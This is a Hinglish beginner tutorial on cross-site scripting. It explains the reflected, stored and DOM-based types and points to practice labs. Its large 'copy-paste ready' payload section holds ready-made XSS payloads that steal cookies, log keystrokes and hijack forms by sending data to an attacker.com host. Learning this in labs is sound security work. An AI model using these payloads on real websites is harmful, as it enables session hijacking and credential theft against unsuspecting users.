# 🛡️ XSS (Cross-Site Scripting) — Complete Guide

> **Level:** Beginner-Intermediate | **Time:** 3-4 hours | **Difficulty:** ⭐⭐

---

## 📖 Kya Hai XSS?

**XSS = Apna JavaScript website par chalaana!**

Jab website user input ko HTML mein directly daalta hai:
```html
<!-- Normal -->
<h1>Hello User!</h1>

<!-- With XSS -->
<h1>Hello <script>alert('XSS!')</script>!</h1>
```

Ye script chalega aur:
- Cookies chori ho sakti hain
- Sessions hijack ho sakte hain
- Phishing attack ho sakta hai
- Malware download ho sakta hai

---

## 3️⃣ Types of XSS

### 1. **Reflected XSS** (Client-side)
- Payload URL mein likha hota hai
- Browser execute karta hai
- Immediate result

```
URL: http://target.com/search?q=<script>alert('XSS')</script>
Victim ye link click kare → XSS execute!
```

### 2. **Stored XSS** (Server-side)
- Payload database mein save hota hai
- Har time jab page load ho → XSS
- Sabse dangerous!

```
Comment likho: <script>alert('XSS')</script>
Database mein save ho gaya!
Jab koi dekhe → Script chalega!
```

### 3. **DOM-Based XSS**
- JavaScript mein vulnerability
- unsafe methods: innerHTML, eval(), etc.
- Client-side processing

```javascript
var input = document.getElementById('search').value;
document.getElementById('results').innerHTML = input; // Vulnerable!
```

---

## 💣 Payloads (Copy-Paste Ready!)

### Reflected XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<iframe onload=alert('XSS')>
<marquee onstart=alert('XSS')>
```

### Stored XSS (Comments)
```html
<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)">
<svg onload="fetch('http://attacker.com/?cookie='+document.cookie)">
```

### Cookie Stealing
```javascript
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>

<script>
new Image().src='http://attacker.com/steal?c='+document.cookie
</script>
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### Form Hijacking
```html
<script>
document.getElementsByTagName('form')[0].action = 'http://attacker.com/steal';
</script>
```

---

## 🧪 Practice Labs

- ☑️ **DVWA:** Stored + Reflected XSS
- ☑️ **Juice Shop:** XSS challenges
- ☑️ **PortSwigger:** 20+ XSS labs
- ☑️ **HackTheBox:** XSS challenges

---

## ✅ Checklist

- [ ] XSS types samjhe
- [ ] Payloads tested
- [ ] Dalfox use kiya
- [ ] Labs complete kiye
- [ ] Real bugs found
- [ ] Reports written

---

**Next:** More vulnerabilities! 🚀